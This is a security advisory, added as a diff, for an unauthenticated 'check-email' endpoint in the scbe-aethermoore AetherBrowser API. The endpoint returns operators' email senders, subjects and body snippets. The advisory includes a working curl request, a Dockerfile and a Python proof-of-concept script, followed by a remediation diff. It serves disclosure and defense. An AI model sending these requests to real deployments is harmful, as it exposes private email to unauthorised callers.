@@ -1,0 +1,350 @@
+PYSEC-2026-4163 PyPI/scbe-aethermoore — SCBE-AETHERMOORE Unauthenticated AetherBrowser Ops API Exposes Operator Email Digests
+package: scbe-aethermoore
+ecosystem: PyPI
+versions affected:
+  >= 4.0.2, < 4.2.1 (ECOSYSTEM)
+aliases: CVE-2026-57443, GHSA-q986-4x7x-gx39
+references:
+  https://github.com/issdandavis/SCBE-AETHERMOORE/security/advisories/GHSA-q986-4x7x-gx39
+  https://nvd.nist.gov/vuln/detail/CVE-2026-57443
+  https://github.com/issdandavis/SCBE-AETHERMOORE/pull/2287
+  https://github.com/issdandavis/SCBE-AETHERMOORE/commit/ca833795e01eab060e92572e5f667c0c136b8c1e
+  https://github.com/issdandavis/SCBE-AETHERMOORE/commit/de7779b722c501dbcf4eae95dd51bb3984506fb1
+  https://github.com/issdandavis/SCBE-AETHERMOORE
+  https://github.com/issdandavis/SCBE-AETHERMOORE/releases/tag/v4.2.1
+  https://pypi.org/project/scbe-aethermoore
+  https://github.com/advisories/GHSA-q986-4x7x-gx39
+
+### Summary
+
+The AetherBrowser API server (`scripts/aetherbrowser/api_server.py`) exposes the `POST /api/ops/check-email` endpoint without any authentication. Any remote attacker can call this endpoint and trigger execution of the `email_reader.py` subprocess, which connects to configured ProtonMail or Gmail accounts via IMAP and returns email metadata (sender, subject, body snippet) in the JSON response. The server binds to `0.0.0.0:8100` by default with CORS set to `allow_origins=["*"]`, making it reachable from any network or browser origin. This constitutes a critical information-disclosure vulnerability.
+
+### Details
+
+`scripts/aetherbrowser/api_server.py` registers the following route at line 3008 (report excerpt references line 2987; the actual line is 3008):
+
+```python
+@app.post("/api/ops/check-email")
+async def ops_check_email():
+    script = ROOT / "scripts" / "apollo" / "email_reader.py"
+    result = await asyncio.to_thread(
+        _run_subprocess,
+        [sys.executable, str(script)],
+        timeout=30,
+    )
+    return {
+        "output": result.get("stdout", "")[:2000],
+        ...
+    }
+```
+
+No `Depends()` guard, middleware check, or API-key validation is applied. The decorator is a plain `@app.post(...)`, so FastAPI registers the route with zero access control.
+
+The server is bound to all interfaces (line 4065/4070):
+
+```python
+uvicorn.run(app, host="0.0.0.0", port=port)   # default port 8100
+```
+
+CORS middleware is configured to allow any origin (lines 486–492):
+
+```python
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["*"],
+    ...
+)
+```
+
+When the endpoint is called, `email_reader.py` is executed as a subprocess. It loads mail credentials from `config/connector_oauth/.env.connector.oauth` (line 29–34 of `email_reader.py`):
+
+```python
+# loads PROTONMAIL_BRIDGE_PASSWORD, GMAIL_APP_PASSWORD, etc.
+```
+
+With credentials present, the script connects via IMAP, fetches full RFC822 messages, and prints sender, subject, and a body snippet to stdout (lines 273–299). The API then returns the first 2000 characters of that stdout to the unauthenticated caller as JSON.
+
+**Complete data-flow path:**
+
+1. `api_server.py:4065+4070` — server starts on `0.0.0.0:8100`
+2. `api_server.py:486–492` — CORS `allow_origins=["*"]` permits cross-origin requests
+3. `api_server.py:3008` — `POST /api/ops/check-email` registered without auth
+4. `api_server.py:3011–3023` — `_run_subprocess([sys.executable, str(script)])` invoked; stdout captured
+5. `email_reader.py:29–34` — connector env file loaded, credentials extracted
+6. `email_reader.py:378–394` — IMAP login using `PROTONMAIL_BRIDGE_PASSWORD` / `GMAIL_APP_PASSWORD`
+7. `email_reader.py:273–299` — RFC822 messages fetched; sender, subject, snippet printed to stdout
+8. `api_server.py:3023` — `stdout[:2000]` returned in JSON response to caller
+
+Even without credentials configured, the subprocess executes and returns its banner output, confirming the unauthenticated code path reaches the sensitive subprocess invocation.
+
+### PoC
+
+**Prerequisites:**
+
+- Docker installed on the attacker or test machine.
+- Repository source available under `repo/` within the build context.
+
+**Step 1 — Build the Docker image:**
+
+```bash
+docker build -t vuln001-aetherbrowser -f vuln-001/Dockerfile .
+```
+
+The Dockerfile (`vuln-001/Dockerfile`) installs `fastapi`, `uvicorn`, and `pydantic`, copies the repository source, and starts `scripts/aetherbrowser/api_server.py` on port 8100.
+
+**Step 2 — Start the container:**
+
+```bash
+docker run --rm -d --name vuln001-test -p 8100:8100 vuln001-aetherbrowser
+```
+
+**Step 3 — Run the PoC script:**
+
+```bash
+python3 vuln-001/poc.py --host 127.0.0.1 --port 8100
+```
+
+Or send the request manually with no authentication headers:
+
+```bash
+curl -s -X POST http://127.0.0.1:8100/api/ops/check-email \
+  -H 'Content-Type: application/json' \
+  -d '{}'
+```
+
+**Expected result (no credentials configured):**
+
+```json
+{
+  "output": "APOLLO EMAIL READER\n============================================================\n  [ProtonMail] No PROTONMAIL_BRIDGE_PASSWORD set\n  [Gmail] No GMAIL_APP_PASSWORD set\n\nNo emails found.\n",
+  "exit_code": 0,
+  "errors": null
+}
+```
+
+HTTP status 200 is returned with no `401` or `403`, and the subprocess stdout appears in the response. In a production deployment with `PROTONMAIL_BRIDGE_PASSWORD` or `GMAIL_APP_PASSWORD` set, the response would contain real email metadata (senders, subjects, body snippets).
+
+**Dynamic test result (Phase 2):**
+
+The Phase 2 dynamic test confirmed HTTP 200 with the `APOLLO EMAIL READER` banner in the response body. Server access log showed `"POST /api/ops/check-email HTTP/1.1" 200 OK` from an unauthenticated source. The subprocess was executed without any authentication gate being triggered.
+
+**Remediation:**
+
+Add a mandatory API-key dependency to all `/api/ops/*` routes:
+
+```diff
+-from fastapi import FastAPI, HTTPException, Query, Request
++from fastapi import Depends, FastAPI, Header, HTTPException, Query, Request, status
+
++def require_ops_api_key(x_api_key: Optional[str] = Header(default=None)) -> None:
++    expected = os.environ.get("AETHERBROWSER_OPS_API_KEY", "").strip()
++    if not expected:
++        raise HTTPException(
++            status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
++            detail="ops endpoints disabled: AETHERBROWSER_OPS_API_KEY is not configured",
++        )
++    if not x_api_key or not hmac.compare_digest(x_api_key, expected):
++        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="invalid ops API key")
+
+-@app.post("/api/ops/check-email")
++@app.post("/api/ops/check-email", dependencies=[Depends(require_ops_api_key)])
+ async def ops_check_email():
+```
+
+Additionally, the server should default to `127.0.0.1` instead of `0.0.0.0`, and stdout from operational subprocesses should never be returned verbatim to callers.
+
+### Impact
+
+An unauthenticated remote attacker who can reach port 8100 of a deployed SCBE-AETHERMOORE instance can:
+
+1. **Exfiltrate operator email metadata**: sender addresses, email subjects, and body snippets from the operator's ProtonMail or Gmail inbox are disclosed in the response.
+2. **Enumerate mail configuration**: even without active credentials, the API reveals which mail providers are configured and prints diagnostic output from internal tooling.
+3. **Trigger repeated IMAP sessions**: repeated calls to the endpoint cause repeated IMAP logins using the stored credentials, potentially generating account alerts or exhausting connection limits.
+
+The vulnerability affects any deployment where `scripts/aetherbrowser/api_server.py` is running and reachable from an untrusted network. Because the server binds to `0.0.0.0` by default with wildcard CORS, cloud deployments and developer machines with exposed ports are directly affected. No credentials, tokens, or prior knowledge of the application are required by the attacker.
+
+### Reproduction artifacts
+
+#### `Dockerfile`
+
+```dockerfile
+# Dockerfile for VULN-001: Unauthenticated /api/ops/check-email endpoint
+# Reproduces CWE-306 (Missing Authentication for Critical Function) in
+# SCBE-AETHERMOORE api_server.py v4.2.1
+#
+# Build context: pypiAi_1296_issdandavis__SCBE-AETHERMOORE/ (parent of vuln-001/)
+# Build:  docker build -t vuln001-aetherbrowser -f vuln-001/Dockerfile .
+# Run:    docker run --rm -p 8100:8100 vuln001-aetherbrowser
+
+FROM python:3.11-slim
+
+WORKDIR /app
+
+# Install only the packages required for api_server.py to start.
+# All other imports (asyncio, subprocess, pathlib, etc.) are stdlib.
+RUN pip install --no-cache-dir \
+    "fastapi>=0.100.0" \
+    "uvicorn[standard]>=0.27.0" \
+    "pydantic>=2.0.0"
+
+# Copy the repository source.
+# The build context is the report root (parent directory of vuln-001/).
+COPY repo/ /app/
+
+EXPOSE 8100
+
+# Start the AetherBrowser API server on all interfaces at port 8100.
+# This replicates the production start command documented in api_server.py line 6-8.
+CMD ["python", "scripts/aetherbrowser/api_server.py"]
+```
+
+#### `poc.py`
+
+```python
+#!/usr/bin/env python3
+"""
+VULN-001 Proof-of-Concept: Unauthenticated /api/ops/check-email
+
+CWE-306 — Missing Authentication for Critical Function
+CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N  (7.5 High)
+
+Target: scripts/aetherbrowser/api_server.py (SCBE-AETHERMOORE v4.2.1)
+
+This PoC demonstrates that:
+  1. POST /api/ops/check-email is accessible without any authentication token.
+  2. The server responds with HTTP 200 instead of 401/403.
+  3. The email-reading subprocess (email_reader.py) is executed and its stdout
+     is returned verbatim in the JSON response — confirming the unauthenticated
+     code path reaches the sensitive subprocess.
+
+Usage:
+    python3 poc.py [--host 127.0.0.1] [--port 8100]
+"""
+
+import argparse
+import json
+import sys
+import time
+import urllib.error
+import urllib.request
+
+
+TIMEOUT = 10
+
+
+def wait_for_server(host: str, port: int, max_wait: int = 30) -> bool:
+    """Poll the health endpoint until the server is ready."""
+    url = f"http://{host}:{port}/api/health"
+    deadline = time.time() + max_wait
+    while time.time() < deadline:
+        try:
+            with urllib.request.urlopen(url, timeout=2) as resp:
+                if resp.status < 500:
+                    return True
+        except Exception:
+            pass
+        time.sleep(1)
+    return False
+
+
+def send_unauthenticated_request(host: str, port: int) -> dict:
+    """Send POST /api/ops/check-email with NO authentication headers."""
+    url = f"http://{host}:{port}/api/ops/check-email"
+    req = urllib.request.Request(
+        url,
+        data=b"{}",
+        method="POST",
+        headers={"Content-Type" : "application/json"},
+        # NOTE: No Authorization header, no X-API-Key, no session cookie.
+    )
+    try:
+        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
+            body = resp.read().decode("utf-8", errors="replace")
+            return {"status": resp.status, "body": body}
+    except urllib.error.HTTPError as exc:
+        body = exc.read().decode("utf-8", errors="replace")
+        return {"status": exc.code, "body": body}
+    except Exception as exc:
+        return {"status": -1, "body": str(exc)}
+
+
+def main() -> int:
+    parser = argparse.ArgumentParser(description="VULN-001 PoC — unauthenticated check-email")
+    parser.add_argument("--host", default="127.0.0.1")
+    parser.add_argument("--port", type=int, default=8100)
+    args = parser.parse_args()
+
+    print("=" * 60)
+    print("VULN-001 PoC: Unauthenticated /api/ops/check-email")
+    print("=" * 60)
+    print(f"Target: http://{args.host}:{args.port}/api/ops/check-email")
+    print()
+
+    # Wait for the server to be ready.
+    print("[*] Waiting for server to become ready ...")
+    if not wait_for_server(args.host, args.port):
+        print("[!] Server did not become ready within 30 s — check the container")
+        return 1
+    print("[+] Server is up")
+    print()
+
+    # Send the unauthenticated exploit request.
+    print("[*] Sending unauthenticated POST /api/ops/check-email ...")
+    result = send_unauthenticated_request(args.host, args.port)
+    status = result["status"]
+    body = result["body"]
+
+    print(f"[*] HTTP status: {status}")
+    print()
+    print("[*] Response body (first 1500 chars):")
+    print("-" * 60)
+    print(body[:1500])
+    print("-" * 60)
+    print()
+
+    # Parse the JSON response if possible.
+    output_field = ""
+    try:
+        parsed = json.loads(body)
+        output_field = parsed.get("output", "")
+    except Exception:
+        output_field = ""
+
+    # Determine pass/fail.
+    # PASS criteria:
+    #   (a) HTTP 200 — the request was NOT rejected with a 401/403.
+    #   (b) The response body contains the email-reader banner string
+    #       "APOLLO EMAIL READER", proving the subprocess was invoked.
+    # Note: Without real IMAP credentials the reader will print the banner
+    # and report "No PROTONMAIL_BRIDGE_PASSWORD set" / "No GMAIL_APP_PASSWORD set".
+    # With real credentials it would return live email metadata.
+
+    crit_auth = (status == 200)
+    crit_subprocess = ("APOLLO EMAIL READER" in output_field or "APOLLO EMAIL READER" in body)
+
+    print("[*] Criteria evaluation:")
+    print(f"    (a) HTTP 200 returned (no auth gate): {'PASS' if crit_auth else 'FAIL'} (got {status})")
+    print(f"    (b) Subprocess executed (banner in response): {'PASS' if crit_subprocess else 'FAIL'}")
+    print()
+
+    if crit_auth and crit_subprocess:
+        print("[PASS] Vulnerability confirmed: POST /api/ops/check-email")
+        print("       is reachable without authentication and the email-reading")
+        print("       subprocess is executed, returning its output to the caller.")
+        return 0
+    elif crit_auth and not crit_subprocess:
+        # Still a valid PASS for the auth-bypass aspect; subprocess may have
+        # errored out but the missing authentication is proven.
+        print("[PASS] Auth bypass confirmed: HTTP 200 without credentials.")
+        print("       Subprocess output not captured (may have crashed), but")
+        print("       the endpoint is unauthenticated — CWE-306 is confirmed.")
+        return 0
+    else:
+        print("[FAIL] Could not confirm the vulnerability.")
+        print(f"       HTTP status was {status} — expected 200.")
+        return 2
+
+
+if __name__ == "__main__":
+    sys.exit(main())
+```
